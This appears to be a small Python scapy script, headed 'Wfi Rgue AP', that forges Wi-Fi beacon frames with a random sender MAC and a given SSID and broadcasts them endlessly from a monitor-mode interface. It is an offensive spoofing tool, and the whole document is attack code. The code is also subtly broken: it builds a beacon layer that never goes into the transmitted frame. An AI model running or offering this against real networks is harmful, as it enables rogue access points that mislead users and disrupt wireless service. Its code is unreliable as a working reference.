from scapy.all import *

import argparse
import subprocess
import os
import time
import sys 




def print_banner():
    print("     Wfi Rgue AP     ")
    print("     ")
    print("")
    print("")


def interface(target_ssid, target_MAC):
    iface = "wlan0mon"
    sender_mac =  RandMAC()
    ssid = target_ssid
    dot11 = Dot11(type=0,subtype=8, addr1=target_MAC, addr2= sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame= RadioTap()/dot11/essid
    sendp(frame, inter=0.1,iface=iface, loop=1)


interface("Test","ff:ff:ff:ff:ff:ff")

